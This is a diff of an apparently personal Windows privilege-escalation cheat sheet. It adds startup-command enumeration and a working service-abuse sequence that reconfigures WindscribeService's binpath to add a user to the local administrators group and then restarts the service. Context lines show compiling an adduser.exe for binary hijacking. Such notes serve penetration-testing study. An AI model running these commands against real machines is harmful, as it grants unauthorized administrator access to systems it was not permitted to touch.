@@ -769,7 +769,10 @@ Ghostpack
 ```
 ### LOLBIN
 ```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
+
 # Binary Hijacking
+## === Modifiable Service Binaries ===
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 icacls "C:\xampp\mysql\bin\mysqld.exe"
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
@@ -783,6 +786,12 @@ Get-ScheduledTask
 ## Watch
 wget https://raw.githubusercontent.com/markwragg/PowerShell-Watch/master/Watch/Public/Watch-Command.ps1
 Get-Process -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 20
+
+# Services
+# === Modifiable Services ===
+sc config WindscribeService binpath="cmd /c net localgroup administrators my /add"
+sc stop WindscribeService
+sc start WindscribeService
 ```
 ### token
 ```powershell
